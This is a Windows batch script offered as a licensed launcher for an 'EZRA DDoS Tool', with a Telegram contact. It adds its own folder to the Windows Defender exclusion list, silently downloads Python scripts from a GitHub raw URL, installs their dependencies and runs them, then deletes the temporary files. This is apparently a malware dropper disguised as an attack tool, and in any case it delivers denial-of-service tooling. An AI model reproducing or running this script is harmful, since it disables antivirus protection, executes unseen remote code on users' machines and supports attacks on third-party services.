@echo off
setlocal enabledelayedexpansion

:: Colors for prompts
set "COLOR_TITLE=0A"
set "COLOR_TEXT=0B"
set "COLOR_ERROR=0C"
set "COLOR_SUCCESS=0A"

:: Temporary folder for resources
set "TEMP_FOLDER=%TEMP%\EZRA_TEMP"
set "RESOURCES_FOLDER=%TEMP_FOLDER%\resources"

:: Cloud URLs
set "MAIN_PY_URL=https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/main.py"
set "SETUP_PY_URL=https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/setup.py"
set "UA_TXT_URL=https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/ua.txt"
set "REQUIREMENTS_TXT_URL=https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/requirements.txt"

:: Trap to ensure cleanup on script exit
set "CLEANUP_ENABLED=1"
call :EnableTrap

:: Function to display a professional interface
cls
call :DisplayTitle
call :DisplayDeviceID

:: Add current directory to antivirus exclusion
call :AddToAntivirusExclusion

:: Check if license is already validated
if exist license.txt (
    echo License validated. Loading EZRA DDoS Tool...
    timeout /t 2 >nul
    goto LoadMain
)

:: Ask for license key
echo.
echo Please enter your purchased license key:
set /p LicenseKey=

:: Validate license key using Python
for /f "delims=" %%A in ('python -c "import hashlib; print(hashlib.sha256(f'VALID-%DeviceID%'.encode()).hexdigest()[:16].upper())"') do set "ExpectedKey=%%A"

if /i "%LicenseKey%"=="%ExpectedKey%" (
    echo Valid license key! > license.txt
    echo Success! License key has been saved.
    timeout /t 2 >nul
) else (
    color %COLOR_ERROR%
    echo Invalid license key. Please try again or contact support.
    timeout /t 5 >nul
    exit /b
)

:LoadMain
cls
call :DisplayTitle
call :DownloadFiles
call :InstallDependencies

:: Run setup.py first
echo Running setup.py to handle additional setup...
python "%TEMP_FOLDER%\setup.py"
if %errorlevel% neq 0 (
    color %COLOR_ERROR%
    echo Failed to execute setup.py. Please check the script for errors.
    exit /b
)

:: Run main.py
echo Running main.py...
python "%TEMP_FOLDER%\main.py"
if %errorlevel% neq 0 (
    color %COLOR_ERROR%
    echo Failed to execute main.py. Please check the script for errors.
    exit /b
)

:: Clean up temporary files and exit
goto :Cleanup

:DownloadFiles
cls
color %COLOR_TEXT%
echo.
echo Downloading required files...

:: Create temp and resources folders
if not exist "%TEMP_FOLDER%" mkdir "%TEMP_FOLDER%"
if not exist "%RESOURCES_FOLDER%" mkdir "%RESOURCES_FOLDER%"

:: Download main.py
echo Downloading main.py...
curl -o "%TEMP_FOLDER%\main.py" "%MAIN_PY_URL%" --silent
if %errorlevel% neq 0 (
    color %COLOR_ERROR%
    echo Failed to download main.py. Please check your internet connection.
    exit /b
)

:: Download setup.py
echo Downloading setup.py...
curl -o "%TEMP_FOLDER%\setup.py" "%SETUP_PY_URL%" --silent
if %errorlevel% neq 0 (
    color %COLOR_ERROR%
    echo Failed to download setup.py. Please check your internet connection.
    exit /b
)

:: Download ua.txt
echo Downloading ua.txt...
curl -o "%RESOURCES_FOLDER%\ua.txt" "%UA_TXT_URL%" --silent
if %errorlevel% neq 0 (
    color %COLOR_ERROR%
    echo Failed to download ua.txt. Please check your internet connection.
    exit /b
)

:: Download requirements.txt
echo Downloading requirements.txt...
curl -o "%TEMP_FOLDER%\requirements.txt" "%REQUIREMENTS_TXT_URL%" --silent
if %errorlevel% neq 0 (
    color %COLOR_ERROR%
    echo Failed to download requirements.txt. Please check your internet connection.
    exit /b
)

color %COLOR_SUCCESS%
echo All files downloaded successfully.
timeout /t 2 >nul
goto :eof

:InstallDependencies
cls
color %COLOR_TEXT%
echo.
echo Installing dependencies from requirements.txt...

:: Check if requirements.txt exists
if not exist "%TEMP_FOLDER%\requirements.txt" (
    color %COLOR_ERROR%
    echo requirements.txt not found. Skipping dependency installation.
    goto :eof
)

:: Install dependencies using pip
pip install -r "%TEMP_FOLDER%\requirements.txt"
if %errorlevel% neq 0 (
    color %COLOR_ERROR%
    echo Failed to install dependencies. Please ensure pip is installed and accessible.
    exit /b
)

color %COLOR_SUCCESS%
echo All dependencies installed successfully.
timeout /t 2 >nul
goto :eof

:DisplayTitle
cls
color %COLOR_TITLE%
echo.
echo **************************************************
echo *                                                *
echo *                  EZRA DDoS TOOL               *
echo *                                                *
echo **************************************************
echo Developed by: t.me/israelezramarket
goto :eof

:DisplayDeviceID
for /f "tokens=2 delims==" %%A in ('wmic csproduct get UUID /value') do set "DeviceID=%%A"
if not defined DeviceID set "DeviceID=UNKNOWN-DEVICE"

color %COLOR_TEXT%
echo.
echo Your Device ID: %DeviceID%
goto :eof

:AddToAntivirusExclusion
cls
color %COLOR_TEXT%
echo Adding the current directory to antivirus exclusion list...

:: Get current directory
set "CurrentDir=%~dp0"

:: Use PowerShell to add to Windows Defender exclusions
powershell -Command "Add-MpPreference -ExclusionPath '%CurrentDir%'"
if %errorlevel% neq 0 (
    color %COLOR_ERROR%
    echo Failed to add the current directory to antivirus exclusions. You may need to do this manually.
    timeout /t 5 >nul
    exit /b
)

color %COLOR_SUCCESS%
echo Successfully added the current directory to antivirus exclusions.
timeout /t 2 >nul
goto :eof

:Cleanup
cls
color %COLOR_TEXT%
echo Cleaning up temporary files...

if exist "%TEMP_FOLDER%" rd /s /q "%TEMP_FOLDER%"
color %COLOR_SUCCESS%
echo Temporary files cleaned up. Exiting script.
exit /b

:EnableTrap
:: Ensures cleanup happens even if the script is closed prematurely
trap (
    if "%CLEANUP_ENABLED%"=="1" (
        call :Cleanup
    )
) >nul
goto :eof
